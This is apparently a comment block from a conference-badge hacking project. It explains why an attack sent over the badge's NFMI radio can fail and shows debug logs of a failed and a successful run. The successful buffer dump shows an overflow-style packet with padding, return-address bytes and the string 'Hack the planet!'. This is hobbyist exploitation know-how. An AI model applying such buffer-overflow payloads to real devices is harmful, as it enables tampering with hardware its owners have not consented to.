: <<'END'
Even under perfect conditions this attack can fail. This is super annoying when you get zero feedback from the badge, so I made a modified version to spit out everything it recieves.

Here is an example of failure due to the the NFMI chip somehow sending the packets to the badge out of order (failure due to dropped packets looks very similar):

Found 'R' (0x52) while looking for 'B'
Found 'O' (0x4f) while looking for 'B'
Found 'R' (0x52) while looking for 'B'
Found 'C' (0x43) while looking for 'B'	 <-- these first 4 are in the buffer after a reboot. "RO" and "RC" have something to do with queue checks, maybe.
Found 'O' (0x4f) while looking for 'B'       
Found '.' (0x2e) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '-' (0x2d) while looking for 'B'
Found '' (0x4) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found 'S' (0x53) while looking for 'B'
Found 'e' (0x65) while looking for 'B'
Found 't' (0x74) while looking for 'B'
Found 'h' (0x68) while looking for 'B'
' (0xd) while looking for 'B'
Found '
       ' (0xa) while looking for 'B'
Found ' ' (0x9) while looking for 'B'
Found 'E' (0x45) while looking for 'B'
Found 'B' (0x42) while looking for 'B'
B 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 53 65
End of buffer no E found!

Note: the badge is still waiting for a packet, and is possibly in an unstable state. Sending it one normal packet with B...E will return it to interactive mode prompt, but it is probably still unstable, so a reset is better.
Reset by power cycling, or maybe send a normal packet then type "^" in the console, or connect with SWD (with J-Link: connect, then r g)



Example of success:

Found 'R' (0x52) while looking for 'B'
Found 'O' (0x4f) while looking for 'B'
Found 'R' (0x52) while looking for 'B'
Found 'C' (0x43) while looking for 'B'
Found 'B' (0x42) while looking for 'B'
B 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 4f 2e 0 0 0 0 0 0 2d 4 0 0 48 61 63 6b 20 74 68 65 20 70 6c 61 6e 65 74 21 d a 0 E -- length = 63
